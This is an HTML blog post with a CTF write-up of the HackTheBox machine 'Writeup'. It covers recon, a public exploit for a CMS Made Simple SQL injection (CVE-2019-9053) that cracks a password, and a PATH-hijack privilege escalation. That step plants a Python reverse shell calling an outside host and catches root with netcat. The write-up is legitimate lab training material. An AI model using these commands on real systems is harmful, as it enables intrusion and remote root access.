@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Writeup - HackTheBox :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="Writeup was my first machine I solved to start my CTF journey. It&#39;s an easy rated box but still interesting and perfect to jump into the CTF bath!
+User Flag Recon Let&#39;s start with the classic nmap:
+$ nmap -sV -sT -sC writeup.htb Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-01 10:39 CEST Nmap scan report for writeup.htb (10.10.10.138) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10&#43;deb9u6 (protocol 2."/>
+<meta name="keywords" content="hackthebox, ctf"/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="https://hg8.github.com/posts/writeup/" />
+
+
+<link rel="stylesheet" href="https://hg8.github.com/assets/style.css">
+
+  <link rel="stylesheet" href="https://hg8.github.com/assets/green.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://hg8.github.com/img/apple-touch-icon-144-precomposed.png">
+
+<link rel="shortcut icon" href="https://hg8.github.com/img/favicon/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="Writeup - HackTheBox :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups." />
+<meta name="twitter:description" content="Writeup was my first machine I solved to start my CTF journey. It&#39;s an easy rated box but still interesting and perfect to jump into the CTF bath!
+User Flag Recon Let&#39;s start with the classic nmap:
+$ nmap -sV -sT -sC writeup.htb Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-01 10:39 CEST Nmap scan report for writeup.htb (10.10.10.138) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10&#43;deb9u6 (protocol 2." />
+<meta name="twitter:site" content="https://hg8.github.com/" />
+<meta name="twitter:creator" content="hg8" />
+<meta name="twitter:image" content="https://hg8.github.com/img/writeup-hackthebox.png">
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Writeup - HackTheBox :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.">
+<meta property="og:description" content="Writeup was my first machine I solved to start my CTF journey. It&#39;s an easy rated box but still interesting and perfect to jump into the CTF bath!
+User Flag Recon Let&#39;s start with the classic nmap:
+$ nmap -sV -sT -sC writeup.htb Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-01 10:39 CEST Nmap scan report for writeup.htb (10.10.10.138) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10&#43;deb9u6 (protocol 2." />
+<meta property="og:url" content="https://hg8.github.com/posts/writeup/" />
+<meta property="og:site_name" content="Writeup - HackTheBox" />
+<meta property="og:image" content="https://hg8.github.com/img/writeup-hackthebox.png">
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+<meta property="article:published_time" content="2019-09-01 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    hg8&#39;s Notes
+  </div>
+</a>
+
+    </div>
+    <div class="menu-trigger">menu</div>
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/">Posts</a></li>
+        
+      
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/">Posts</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://hg8.github.com/posts/writeup/">Writeup - HackTheBox</a></h1>
+  <div class="post-meta">
+      
+    <span class="post-date">
+      2019-09-01
+    </span>
+    
+    
+    <span class="post-author">::
+      hg8
+    </span>
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="https://hg8.github.com/tags/hackthebox/">hackthebox</a>&nbsp;
+    
+    #<a href="https://hg8.github.com/tags/ctf/">ctf</a>&nbsp;
+    
+  </span>
+  
+
+  
+  <img src="https://hg8.github.com/img/writeup-hackthebox.png" class="post-cover" />
+  
+
+  <div class="post-content">
+    <p>Writeup was my first machine I solved to start my CTF journey. It's an easy rated box but still interesting and perfect to jump into the CTF bath!</p>
+<h1 id="user-flag">User Flag</h1>
+<h2 id="recon">Recon</h2>
+<p>Let's start with the classic nmap:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ nmap -sV -sT -sC writeup.htb           
+Starting Nmap 7.70 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2019-09-01 10:39 CEST
+Nmap scan report <span style="color:#66d9ef">for</span> writeup.htb <span style="color:#f92672">(</span>10.10.10.138<span style="color:#f92672">)</span>
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+80/tcp open  http    Apache httpd 2.4.25 <span style="color:#f92672">(</span><span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span><span style="color:#f92672">)</span>
+| http-robots.txt: <span style="color:#ae81ff">1</span> disallowed entry 
+|_/writeup/
+|_http-server-header: Apache/2.4.25 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span>
+|_http-title: Nothing here yet.
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 32.23 seconds
+</code></pre></div><p>A classic, port 80 and 22. <code>nmap</code> did a bit extra work for us and found the the <code>robots.txt</code> show an interesting entry : <code>/writeup/</code></p>
+<p>First thing we see when opening the 80 port is this message :</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/64074062-b592c900-cc95-11e9-97eb-5199438c8feb.png" alt="2019-09-01-105047_1387x643_scrot"></p>
+<p>So there a DOS protection checking apache logs for 40X errors. Probably a fail2ban or something. Let's avoid classic enumeration scripts to not get banned.</p>
+<p>The footer says :</p>
+<blockquote>
+<p>Page is hand-crafted with vi.</p>
+</blockquote>
+<p>That's an interesting fact to keep in mind, maybe can access vi backups file (something like <code>index.php~</code> or <code>index.php.swp</code>) and have a look at the source code.</p>
+<p>The <code>/writeup/</code> endpoint countains, well, writeups. The website seems rather basic :</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/64074102-a3fdf100-cc96-11e9-92fb-53bcb44da0ba.png" alt="2019-09-01-105747_1455x764_scrot"></p>
+<p>Each writeup is accessible throught the URL in the following form :</p>
+<pre><code>http://writeup.htb/writeup/index.php?page={writeup-name}
+</code></pre><p>After digging a bit we found there is no Local File Inclusion vulnerabilities nor <code>vim</code> backup files accessible.</p>
+<h3 id="exploit">Exploit</h3>
+<p>Checking the source code inform us that the website was made using <code>CMS Made Simple</code> :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#960050;background-color:#1e0010">$</span><span style="color:#960050;background-color:#1e0010"> </span><span style="color:#960050;background-color:#1e0010">h</span><span style="color:#960050;background-color:#1e0010">t</span><span style="color:#960050;background-color:#1e0010">t</span><span style="color:#960050;background-color:#1e0010">p</span><span style="color:#960050;background-color:#1e0010"> </span><span style="color:#960050;background-color:#1e0010">w</span><span style="color:#960050;background-color:#1e0010">r</span><span style="color:#960050;background-color:#1e0010">i</span><span style="color:#960050;background-color:#1e0010">t</span><span style="color:#960050;background-color:#1e0010">e</span><span style="color:#960050;background-color:#1e0010">u</span><span style="color:#960050;background-color:#1e0010">p</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">h</span><span style="color:#960050;background-color:#1e0010">t</span><span style="color:#960050;background-color:#1e0010">b</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">w</span><span style="color:#960050;background-color:#1e0010">r</span><span style="color:#960050;background-color:#1e0010">i</span><span style="color:#960050;background-color:#1e0010">t</span><span style="color:#960050;background-color:#1e0010">e</span><span style="color:#960050;background-color:#1e0010">u</span><span style="color:#960050;background-color:#1e0010">p</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">i</span><span style="color:#960050;background-color:#1e0010">n</span><span style="color:#960050;background-color:#1e0010">d</span><span style="color:#960050;background-color:#1e0010">e</span><span style="color:#960050;background-color:#1e0010">x</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">p</span><span style="color:#960050;background-color:#1e0010">h</span><span style="color:#960050;background-color:#1e0010">p</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
+Server<span style="color:#f92672">:</span> <span style="color:#ae81ff">Apache/2.4.25 (Debian)</span>
+Set-Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">CMSSESSID9d3962=lgt7j00rvndgl4; path=/</span>
+Vary<span style="color:#f92672">:</span> <span style="color:#ae81ff">Accept-Encoding</span>
+
+&lt;!doctype html&gt;
+&lt;html lang=&#34;en_US&#34;&gt;&lt;head&gt;
+	&lt;title&gt;Home - writeup&lt;/title&gt;
+	
+&lt;base href=&#34;http://writeup.htb/writeup/&#34; /&gt;
+&lt;meta name=&#34;Generator&#34; content=&#34;CMS Made Simple - Copyright (C) 2004-2019. All rights reserved.&#34; /&gt;
+[...]
+</code></pre></div><p>A quick search return a fairly recent vulnerability, CVE-2019-9053 :</p>
+<blockquote>
+<p>An issue was discovered in CMS Made Simple 2.2.8. It is possible with the News module, through a crafted URL, to achieve unauthenticated blind time-based SQL injection via the m1_idlist parameter.</p>
+</blockquote>
+<p>And an exploit is already available, perfect!</p>
+<p>Looking at the source code we can see we have a very well crafted and complete exploit. It will :</p>
+<ol>
+<li>Dump the salt used by CMS Made Simple</li>
+<li>Dump the username</li>
+<li>Dump the email</li>
+<li>Dump the password</li>
+<li>And even have a function to crack the found hashed password</li>
+</ol>
+<p>Let's try it :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ wget https://www.exploit-db.com/raw/46635 -O cmssimple.py
+$ python cmssimple.py -u http://writeup.htb/writeup/ --crack -w <span style="color:#e6db74">&#34;~/SecLists/Passwords/Leaked-Databases/rockyou.txt&#34;</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Salt <span style="color:#66d9ef">for</span> password found: 5a599ef579066807
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Username found: jkr
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Email found: jkr@writeup.htb
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Password found: 62def4866937f08cc13bab43bb14e6f7
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Password cracked: raykayjay9
+</code></pre></div><p>Really nice exploit here. So we have an username and a password.</p>
+<p>The CMS Made Simple admin page can not be accessed using those credentials, so let's try with SSH :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh jkr@writeup.htb
+jkr@writeup.htb<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
+Linux writeup 4.9.0-8-amd64 x86_64 GNU/Linux
+
+The programs included with the Devuan GNU/Linux system are free software;
+the exact distribution terms <span style="color:#66d9ef">for</span> each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sun Sep  <span style="color:#ae81ff">1</span> 05:07:51 <span style="color:#ae81ff">2019</span> from 10.10.10.85
+jkr@writeup:~$ cat user.txt 
+d4e493fd4068afc9eb1aa6a55319f978
+jkr@writeup:~$ 
+</code></pre></div><h2 id="root-flag">Root Flag</h2>
+<h3 id="recon-1">Recon</h3>
+<p>As a recon phase let's run <a href="https://github.com/DominicBreuker/pspy"><code>pspy</code></a> to check running process. And paying closer attention de process run as root.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ <span style="color:#75715e"># Attacker box</span>
+$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
+$ scp pspy64 jkr@writeup.htb:~ 
+jkr@writeup.htb<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
+pspy64   100% 3006KB 111.9KB/s   00:26    
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">jkr@writeup:~$ chmod +x pspy64  <span style="color:#f92672">&amp;&amp;</span> ./pspy64
+</code></pre></div><p>After watching the processes for a while, we will see a few other users succeding the user challenge and connect to SSH aswell. And something interresting appears :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">05:37:15 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">11674</span>  | sshd: <span style="color:#f92672">[</span>accepted<span style="color:#f92672">]</span>
+05:37:15 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">102</span>  PID<span style="color:#f92672">=</span><span style="color:#ae81ff">11675</span>  | sshd: <span style="color:#f92672">[</span>net<span style="color:#f92672">]</span>       
+05:37:29 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">11676</span>  | sshd: jkr <span style="color:#f92672">[</span>priv<span style="color:#f92672">]</span>  
+05:37:29 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">11677</span>  | sh -c /usr/bin/env -i PATH<span style="color:#f92672">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d &gt; /run/motd.dynamic.new 
+05:37:29 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">11678</span>  | run-parts --lsbsysinit /etc/update-motd.d 
+05:37:29 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">11679</span>  | uname -rnsom 
+05:37:29 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">11680</span>  | sshd: jkr <span style="color:#f92672">[</span>priv<span style="color:#f92672">]</span>  
+05:37:29 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">1000</span> PID<span style="color:#f92672">=</span><span style="color:#ae81ff">11681</span>  | sshd: jkr@pts/2
+</code></pre></div><p>A few commands are run as <code>root</code> upon users login. Let's dig.</p>
+<p>First command that caught the attention is <code>run-parts --lsbsysinit /etc/update-motd.d</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ man run-parts
+run-parts runs all the executable files named within constraints described below, found in directory <span style="color:#f92672">[</span>directory<span style="color:#f92672">]</span>.
+</code></pre></div><p>Sounds promising. If we can add a script to <code>/etc/update-motd.d</code> it will be executed as root on next login.</p>
+<p>Unfortunately we don't have writting rights to <code>/etc/update-motd.d</code> nor to the file present in it:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">jkr@writeup:~$ ls -l /etc/update-motd.d/
+total <span style="color:#ae81ff">4</span>
+-rwxr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">23</span> Jun  <span style="color:#ae81ff">3</span>  <span style="color:#ae81ff">2018</span> 10-uname
+</code></pre></div><p>That looks like a dead end here.</p>
+<p>Another thing we noticed is that executable are called in relative path and not absolute. And the first command gives the full <code>PATH</code> env variable before launching the <code>run-parts</code> command.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sh -c /usr/bin/env -i PATH<span style="color:#f92672">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d &gt; /run/motd.dynamic.new 
+</code></pre></div><p>As a reminder, when a command is called Linux will search in the <code>PATH</code> environement variable to find where this executable is located. So in the command above, Linux system will first look in the <code>/usr/local/sbin</code> to see if <code>run-parts</code> is there, then in <code>/usr/local/bin</code> etc&hellip;</p>
+<p>Let's check where <code>run-parts</code> is :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">jkr@writeup:~$ which run-parts
+/bin/run-parts
+</code></pre></div><p>So it's <code>/bin/</code> folder, the last on the <code>PATH</code> list. That mean if we can write an executable named <code>run-parts</code> in either :</p>
+<ul>
+<li><code>/usr/local/sbin/</code></li>
+<li><code>/usr/local/bin/</code></li>
+<li><code>/usr/sbin/</code></li>
+<li><code>/usr/bin/</code></li>
+<li><code>/sbin/</code></li>
+</ul>
+<p>then it will be ran instead of the real <code>/bin/run-parts</code> and as root. If we have writting rights in any of those folder then it's bingo.</p>
+<h3 id="privilege-escalation">Privilege escalation</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Bash reserve shell doesn&#39;t work, let&#39;s use the python one</span>
+jkr@writeup:~$ cat /usr/local/sbin/run-parts 
+python -c <span style="color:#e6db74">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.10.85&#34;,8585));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span>
+jkr@writeup:~$ chmod +x /usr/local/sbin/run-parts
+jkr@writeup:~$
+</code></pre></div><p>Let's listen to incoming connection :</p>
+<pre><code>nc -l -vv -p 8585
+Listening on any address 8585
+</code></pre><p>Now we logout and login again to the box to initiate the <code>sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d &gt; /run/motd.dynamic.new </code> command.</p>
+<p>And surely we receive the connection immediatly :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc -l -vv -p <span style="color:#ae81ff">8585</span>
+Listening on any address <span style="color:#ae81ff">8585</span>
+Connection from 10.10.10.138:37078
+<span style="color:#75715e"># id</span>
+uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
+<span style="color:#75715e"># cat /root/root.txt</span>
+eeba47f60b48ef92b734f9b6198d7226
+</code></pre></div><p>That's it! As always do not hesitate to contact me for any questions or feedbacks.</p>
+<p>See you next time !</p>
+<p>-hg8</p>
+
+  </div>
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2020 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="https://hg8.github.com/assets/main.js"></script>
+<script src="https://hg8.github.com/assets/prism.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
